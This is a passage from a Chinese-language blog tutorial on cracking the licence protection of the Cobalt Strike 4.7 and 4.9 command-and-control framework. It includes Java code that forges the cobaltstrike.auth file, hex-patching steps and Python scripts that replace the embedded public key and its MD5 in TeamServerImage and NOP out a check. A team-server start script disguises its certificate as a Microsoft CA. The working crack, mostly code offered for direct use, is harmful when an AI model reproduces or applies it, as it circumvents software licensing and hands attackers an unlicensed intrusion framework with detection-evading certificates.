     0, 0, 0, 1,<br>        //         43,<br>        //         16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        //         16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        //         16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        //         16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span><br>        // &#125;; // 4.3<br>        byte[] data=&#123;<br>                <span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>,<br>                0, <span class="hljs-string">-54</span>,<br>                1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127,<br>                23, 80, 101, <span class="hljs-string">-22</span>,<br>                47,<br>                16, 27, <span class="hljs-string">-27</span>, <span class="hljs-string">-66</span>, 82, <span class="hljs-string">-58</span>, 37, 92, 51, 85, <span class="hljs-string">-114</span>, <span class="hljs-string">-118</span>, 28, <span class="hljs-string">-74</span>, 103, <span class="hljs-string">-53</span>, 6,<br>                16, <span class="hljs-string">-128</span>, <span class="hljs-string">-29</span>, 42, 116, 32, 96, <span class="hljs-string">-72</span>, <span class="hljs-string">-124</span>, 65, <span class="hljs-string">-101</span>, <span class="hljs-string">-96</span>, <span class="hljs-string">-63</span>, 113, <span class="hljs-string">-55</span>, <span class="hljs-string">-86</span>, 118,<br>                16, <span class="hljs-string">-78</span>, 13, 72, 122, <span class="hljs-string">-35</span>, <span class="hljs-string">-44</span>, 113, 52, 24, <span class="hljs-string">-14</span>, <span class="hljs-string">-43</span>, <span class="hljs-string">-93</span>, <span class="hljs-string">-82</span>, 2, <span class="hljs-string">-89</span>, <span class="hljs-string">-96</span>,<br>                16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span>,<br>                16, 94, <span class="hljs-string">-104</span>, 25, 74, 1, <span class="hljs-string">-58</span>, <span class="hljs-string">-76</span>, <span class="hljs-string">-113</span>, <span class="hljs-string">-91</span>, <span class="hljs-string">-126</span>, <span class="hljs-string">-90</span>, <span class="hljs-string">-87</span>, <span class="hljs-string">-4</span>, <span class="hljs-string">-69</span>, <span class="hljs-string">-110</span>, <span class="hljs-string">-42</span>,<br>                16, <span class="hljs-string">-13</span>, <span class="hljs-string">-114</span>, <span class="hljs-string">-77</span>, <span class="hljs-string">-47</span>, <span class="hljs-string">-93</span>, 53, <span class="hljs-string">-78</span>, 82, <span class="hljs-string">-75</span>, <span class="hljs-string">-117</span>, <span class="hljs-string">-62</span>, <span class="hljs-string">-84</span>, <span class="hljs-string">-34</span>, <span class="hljs-string">-127</span>, <span class="hljs-string">-75</span>, 66,<br>                0, 0, 0, 24,<br>                105, 100, 118, 121, 85, 97, 77, 68, 75, 117, 98, 87, 87, 52, 84, 76, 51, 105, 80, 106, 66, 119, 61, 61,<br>                16, <span class="hljs-string">-71</span>, <span class="hljs-string">-86</span>, 51, 8, 10, 90, <span class="hljs-string">-112</span>, 49, 62, <span class="hljs-string">-15</span>, <span class="hljs-string">-99</span>, <span class="hljs-string">-64</span>, 98, 125, 46, <span class="hljs-string">-95</span>,<br>                28, 115, 53, 57, 108, 53, 105, 113, 49, 101, 106, 90, 51, 79, 81, 100, 47, 115, 103, 118, 78, 97, 103, 61, 61, 113, <span class="hljs-string">-112</span>, <span class="hljs-string">-42</span>, 104,<br>                16, <span class="hljs-string">-122</span>, 56, <span class="hljs-string">-75</span>, 17, <span class="hljs-string">-32</span>, 91, 85, 123, <span class="hljs-string">-7</span>, 112, <span class="hljs-string">-60</span>, 24, 53, 109, 68, <span class="hljs-string">-12</span><br>        &#125;; // 4.7<br>        byte[] rsaByte = PairGenerator.encryptPri(data, PairGenerator.getPrivateKey());<br>        PairGenerator.byte2File(&quot;RSA/cobaltstrike.auth&quot;, rsaByte);<br>        PairGenerator.byte2File(&quot;RSA/authkey.private&quot;, PairGenerator.getPrivateKey().getEncoded());<br>        PairGenerator.byte2File(&quot;RSA/authkey.pub&quot;, PairGenerator.getPublicKey().getEncoded());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​将<code>RSA</code>目录下的密钥，复制到<code>src/resources</code>目录下，同时将<code>decompiled_src/cobaltstrike-client/common/AuthCrypto.java</code>复制到<code>src/common/AuthCrypto</code>，计算<code>authkey.pub</code>的md5，并替换<code>src/common/AuthCrypto</code>第28行的数值。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">certutil</span> -hashfile authkey.pub MD5<br></code></pre></td></tr></table></figure><p>最后将<code>RSA/cobaltstrike.auth</code>复制到<code>out</code>文件下，和编译好的jar包同一目录。</p><h3 id="CobaltStrike-server-破解"><a href="#CobaltStrike-server-破解" class="headerlink" title="CobaltStrike server 破解"></a>CobaltStrike server 破解</h3><p>​与CobaltStrike client类似，CobaltStrike server端同样需要替换<code>authkey.pub</code>文件和<code>authkey.pub</code>的MD5，由于CobaltStrike 4.7版本以后，为了防破解，CobaltStrike server端变成了二进制文件<code>TeamServerImage</code>，因此我们可以使用<code>winhex</code>或者<code>010 Editor</code>直接对二进制文件进行修改。</p><ul><li><p>修改<code>authkey.pub</code>。从CobaltStrike client中提取官方<code>resources/authkey.pub</code>，使用<code>winhex</code>或者<code>010 Editor</code>复制二进制数据并在<code>TeamServerImage</code>全局搜索（大概位置在<code>0x48F2570</code>附近），例如CobaltStrike 4.7的<code>authkey.pub</code>的数据如下，将其修改为上面自己认证的<code>authkey.pub</code>内容即可。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">30820122300d</span>06092A8648<span class="hljs-number">86F70D0101</span>.....<br></code></pre></td></tr></table></figure></li><li><p>修改<code>authkey.pub</code>的MD5，从CobaltStrike client中的<code>/common/AuthCrypto</code>提取第28行的原始MD5数值，使用<code>winhex</code>或者<code>010 Editor</code>复制二进制数据并在<code>TeamServerImage</code>全局搜索（大概位置在0x3e08120附近），例如CobaltStrike 4.7的<code>authkey.pub</code>的数据为<code>8bb4df00c120881a1945a43e2bb2379e</code>，将其修改为上面自己认证的<code>authkey.pub</code>的MD5即可。</p></li><li><p>可以使用以下python脚本一键替换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CalcMD5</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(data)<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ReplaceData</span>(<span class="hljs-params">data, original_data, replacement_data</span>):<br>    pos = data.find(original_data)<br>    <span class="hljs-keyword">while</span> pos != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(replacement_data)):<br>            data[pos+i] = replacement_data[i]<br>        pos = data.find(original_data)<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Crack</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./TeamServerImage&#x27;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f1, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./TeamServerImageCrack&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-keyword">as</span> f2:<br>        dataSrc = src.read()<br>        dataDst = dst.read()<br>        md5Src = CalcMD5(dataSrc)<br>        md5Dst = CalcMD5(dataDst)<br>        data = <span class="hljs-built_in">bytearray</span>(f1.read())<br><br>        ReplaceData(data, md5Src.encode(), md5Dst.encode())<br>        ReplaceData(data, dataSrc, dataDst)<br>        f2.write(data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseArgs</span>():<br>    parser = ArgumentParser(<br>        prog=<span class="hljs-string">&#x27;crack.py&#x27;</span>, description=<span class="hljs-string">&#x27;Crack TeamServerImage&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--src&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;origin authkey.pub file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-d&#x27;</span>, <span class="hljs-string">&#x27;--dst&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;crack authkey.pub file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;crack TeamServerImage file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    args = parseArgs()<br>    Crack(args.src, args.dst)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">./crack.py -s authkey_orign.<span class="hljs-keyword">pub</span> -d authkey_crack.<span class="hljs-keyword">pub</span> -t <span class="hljs-type">TeamServerImage</span><br># authkey_orign.<span class="hljs-keyword">pub</span> 官方原版公钥aythkey.<span class="hljs-keyword">pub</span><br># authkey_crack.<span class="hljs-keyword">pub</span> 子签证公钥aythkey.<span class="hljs-keyword">pub</span><br># <span class="hljs-type">TeamServerImage</span> 官方原版<span class="hljs-type">TeamServerImage</span><br># output <span class="hljs-type">TeamServerImageCrack</span><br></code></pre></td></tr></table></figure></li><li><p>服务端程序启动方法：创建bash脚本，启动即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Start Cobalt Strike Team Server</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># make pretty looking messages (thanks Carlos)</span><br><span class="hljs-keyword">function</span> print_good () &#123;<br>    echo -e <span class="hljs-string">&quot;\x1B[01;32m[+]\x1B[0m $1&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> print_error () &#123;<br>    echo -e <span class="hljs-string">&quot;\x1B[01;31m[-]\x1B[0m $1&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> print_info () &#123;<br>    echo -e <span class="hljs-string">&quot;\x1B[01;34m[*]\x1B[0m $1&quot;</span><br>&#125;<br><br><span class="hljs-comment"># check that we&#x27;re r00t</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$UID</span> -ne <span class="hljs-number">0</span> ]; then<br>print_error <span class="hljs-string">&quot;Superuser privileges are required to run the team server&quot;</span><br><span class="hljs-keyword">exit</span><br>fi<br><br><span class="hljs-comment"># check if java is available...</span><br><span class="hljs-keyword">if</span> [ $(command -v java) ]; then<br>true<br><span class="hljs-keyword">else</span><br>print_error <span class="hljs-string">&quot;java is not in \$PATH&quot;</span><br>echo <span class="hljs-string">&quot;    is Java installed?&quot;</span><br><span class="hljs-keyword">exit</span><br>fi<br><br><span class="hljs-comment"># check if keytool is available...</span><br><span class="hljs-keyword">if</span> [ $(command -v keytool) ]; then<br>true<br><span class="hljs-keyword">else</span><br>print_error <span class="hljs-string">&quot;keytool is not in \$PATH&quot;</span><br>echo <span class="hljs-string">&quot;    install the Java Developer Kit&quot;</span><br><span class="hljs-keyword">exit</span><br>fi<br><br><span class="hljs-comment"># generate a certificate</span><br><span class="hljs-comment"># naturally you&#x27;re welcome to replace this step with your own permanent certificate.</span><br><span class="hljs-comment"># just make sure you pass -Djavax.net.ssl.keyStore=&quot;/path/to/whatever&quot; and</span><br><span class="hljs-comment"># -Djavax.net.ssl.keyStorePassword=&quot;password&quot; to java. This is used for setting up</span><br><span class="hljs-comment"># an SSL server socket. Also, the SHA-1 digest of the first certificate in the store</span><br><span class="hljs-comment"># is printed so users may have a chance to verify they&#x27;re not being owned.</span><br><span class="hljs-keyword">if</span> [ -e ./cobaltstrike.store ]; then<br>print_info <span class="hljs-string">&quot;Will use existing X509 certificate and keystore (for SSL)&quot;</span><br><span class="hljs-keyword">else</span><br>print_info <span class="hljs-string">&quot;Generating X509 certificate and keystore (for SSL)&quot;</span><br>keytool -keystore ./cobaltstrike.store -storepass <span class="hljs-number">123456</span> -keypass <span class="hljs-number">123456</span> -genkey -keyalg RSA -alias cobaltstrike -dname <span class="hljs-string">&quot;CN=Microsoft IT TLS CA 5, OU=Microsoft IT, O=Microsoft Corporation, L=Redmond, S=Washington, C=US&quot;</span><br>fi<br><br>.<span class="hljs-regexp">/TeamServerImage -Dcobaltstrike.server_port=43681 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./</span>cobaltstrike.store -Djavax.net.ssl.keyStorePassword=<span class="hljs-number">123456</span> teamserver $*<br></code></pre></td></tr></table></figure></li></ul><h3 id="CobaltStrike-4-9破解说明"><a href="#CobaltStrike-4-9破解说明" class="headerlink" title="CobaltStrike 4.9破解说明"></a>CobaltStrike 4.9破解说明</h3><p>​在<code>CobaltStrike破解</code>中，我们介绍了<code>CobaltStrike</code>破解过程，该方法正对<code>CobaltStrike 4.9</code>之前的版本是完全成功的，但在<code>CobaltStrike 4.9 server</code>版本中<code>server</code>端加入更多验证，需要额外的一些操作，因此有了本节<code>CobaltStrike server 4.9补充破解</code>，<strong>注意，本节需要在<code>CobaltStrike</code>破解过程的基础上进行</strong>。</p><ul><li>使用IDA打开<code>TeamServerImage</code>，定位到<code>0x0000000000BC8DE7</code>，可以看到<code>Arrays_copyOfRange</code>函数的参数为256和512，表示取<code>cobaltstrike.auth</code>文件的256到512字节，通过<code>common_AuthCrypto_decrypt2</code>进行解密处理，<code>common_AuthCrypto_decrypt2</code>的解密逻辑暂时还未破解成功，因此。我们直接<code>nop</code>掉就行，直接从<code>cobaltstrike.auth</code>文件中读取解密后的内容即可。</li></ul><p><img src="https://img-blog.csdnimg.cn/direct/7350b52f29f540b8a901b4f91a8e34c3.png" alt="image-20231023183422779"></p><p><img src="https://img-blog.csdnimg.cn/direct/f88598e8b22041e6a03550162a9ed235.png" alt="image-20231023183730904"></p><p>​这里我也写了一个python脚本，一键破解原版TeamServeImage：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><br><br>authkey_b64 = <span class="hljs-string">&quot;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkgtvDimGFGRAs2rwqZ7EOnLJknr4LNtQwZ1n8PiXEegmnP//rdXal4VenANymQXZ1F6Ln3+98oFTWNQrxpDrau3NR5lMoELx41SxA46p/+ljNBqQ8+HMkxDlueImMbNgizI4uT9XV+UPB0mhv31v1FT+dMMKS/UKKhz/r9yoEgwmXTIfTGLUS6+GTfyvrjotN3xsJlx3aHtO1yL3bz0h4Jxz8v6DanuqBkz2K0T1r++ECqNopH0vtvWihLrmkDYm0ST+/NXLhd5djyYQuaEc9nYrip/iefs9BVFGBuKMUmSoT9+1bHp4GXWhloEq/5+w+UlYLI0pNNqVJVEgAtdiRwIDAQAB&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CalcMD5</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(data)<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ReplaceData</span>(<span class="hljs-params">data, original_data, replacement_data</span>):<br>    pos = data.find(original_data)<br>    <span class="hljs-keyword">while</span> pos != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(replacement_data)):<br>            data[pos+i] = replacement_data[i]<br>        pos = data.find(original_data)<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Crack</span>(<span class="hljs-params">dst</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./TeamServerImage&#x27;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f1, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./TeamServerImageCrack&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-keyword">as</span> f2:<br>        dataSrc = base64.b64decode(authkey_b64)<br>        dataDst = dst.read()<br>        md5Src = CalcMD5(dataSrc)<br>        md5Dst = CalcMD5(dataDst)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(dataSrc))+<span class="hljs-string">&quot; &quot;</span>+md5Src)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(dataSrc))+<span class="hljs-string">&quot; &quot;</span>+md5Dst)<br>        data = <span class="hljs-built_in">bytearray</span>(f1.read())<br><br>        ReplaceData(data, md5Src.encode(), md5Dst.encode())<br>        ReplaceData(data, dataSrc, dataDst)<br>        ReplaceData(data,<span class="hljs-string">b&quot;\xE8\x36\x1d\x00\x00&quot;</span>,<span class="hljs-string">b&quot;\x90\x90\x90\x90\x90&quot;</span>)<br>        f2.write(data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Crack TeamServerImage success.&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseArgs</span>():<br>    parser = ArgumentParser(<br>        prog=<span class="hljs-string">&#x27;crack.py&#x27;</span>, description=<span class="hljs-string">&#x27;Crack TeamServerImage&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--src&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;origin authkey.pub file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">False</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-d&#x27;</span>, <span class="hljs-string">&#x27;--dst&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;crack authkey.pub file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;crack TeamServerImage file&#x27;</span>,<br>                        <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    args = parseArgs()<br>    Crack(args.dst)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><ul><li><p>密钥文件生成代码也需要进行稍微修改</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td 